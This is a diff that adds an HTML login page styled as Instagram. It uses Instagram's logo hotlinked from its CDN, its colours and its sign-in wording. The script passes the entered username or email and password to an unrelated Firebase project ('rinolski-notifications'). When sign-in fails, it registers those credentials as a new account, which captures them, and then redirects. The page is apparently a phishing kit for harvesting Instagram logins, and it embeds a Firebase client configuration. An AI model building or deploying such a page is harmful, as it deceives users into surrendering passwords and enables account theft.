@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Login</title>
+<style>
+  * { box-sizing: border-box; }
+
+  body {
+    background-color: #101418;
+    color: #fff;
+    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+  }
+
+  .lang {
+    position: absolute;
+    top: 20px;
+    color: #9aa0a6;
+    font-size: 13px;
+  }
+
+  .container {
+    width: 90%;
+    max-width: 340px;
+    text-align: center;
+  }
+
+  .logo {
+    width: 70px;
+    height: 70px;
+    margin: 0 auto 40px;
+    background: url("PUT-YOUR-LOGO-HERE.png") center/cover no-repeat;
+    border-radius: 16px;
+  }
+
+  /* 🔹 Added image slot */
+  .top-image {
+    width: 70px;
+    height: 70px;
+    margin: 0 auto 40px;
+    display: block;
+    object-fit: cover;
+    border-radius: 16px;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 10px;
+    background-color: #1c1f24;
+    border: 1px solid #333;
+    border-radius: 8px;
+    font-size: 14px;
+    color: #fff;
+  }
+  input::placeholder { color: #9aa0a6; }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background-color: #0095f6;
+    border: none;
+    border-radius: 25px;
+    color: #fff;
+    font-weight: 600;
+    font-size: 15px;
+    cursor: pointer;
+    margin-top: 5px;
+  }
+  button:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  .link {
+    margin-top: 15px;
+    color: #0095f6;
+    font-size: 13px;
+    cursor: pointer;
+  }
+
+  .divider {
+    height: 1px;
+    background-color: #333;
+    margin: 25px 0;
+  }
+
+  .outline-btn {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #0095f6;
+    background: none;
+    color: #0095f6;
+    border-radius: 25px;
+    font-weight: 600;
+    cursor: pointer;
+  }
+
+  .error {
+    color: #ff5555;
+    font-size: 13px;
+    margin-top: 8px;
+    min-height: 18px;
+  }
+</style>
+</head>
+<body>
+
+<div class="lang">English (US)</div>
+
+<div class="container">
+  <!-- 🔹 Place your image here -->
+  <img src="https://static.cdninstagram.com/rsrc.php/v4/yA/r/O_3Ggpr3_aA.png" alt="Logo" class="top-image">
+
+  <div class="logo"></div>
+
+  <input type="email" id="email" placeholder="Username, email or mobile number" />
+  <input type="password" id="password" placeholder="Password" />
+
+  <button id="loginBtn">Log in</button>
+  <div class="link" id="forgot">Forgot password?</div>
+
+  <div class="divider"></div>
+
+  <button class="outline-btn" id="signupBtn">Create new account</button>
+  <div class="error" id="errorMessage"></div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+  import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
+    authDomain: "rinolski-notifications.firebaseapp.com",
+    databaseURL: "https://rinolski-notifications-default-rtdb.firebaseio.com",
+    projectId: "rinolski-notifications",
+    storageBucket: "rinolski-notifications.firebasestorage.app",
+    messagingSenderId: "355554579853",
+    appId: "1:355554579853:web:3caa961653c0cdc0a359c4",
+    measurementId: "G-WZ84970GST"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+
+  const loginBtn = document.getElementById("loginBtn");
+  const signupBtn = document.getElementById("signupBtn");
+  const errorMessage = document.getElementById("errorMessage");
+
+  async function handleLogin() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+    errorMessage.textContent = "";
+    loginBtn.disabled = true;
+
+    try {
+      await signInWithEmailAndPassword(auth, email, password);
+      window.location.href = "home.html";
+    } catch {
+      // If login fails, create account
+      try {
+        await createUserWithEmailAndPassword(auth, email, password);
+        window.location.href = "home.html";
+      } catch (e) {
+        errorMessage.textContent = e.message;
+      }
+    }
+    loginBtn.disabled = false;
+  }
+
+  loginBtn.addEventListener("click", handleLogin);
+  signupBtn.addEventListener("click", handleLogin);
+</script>
+
+</body>
+  </html>
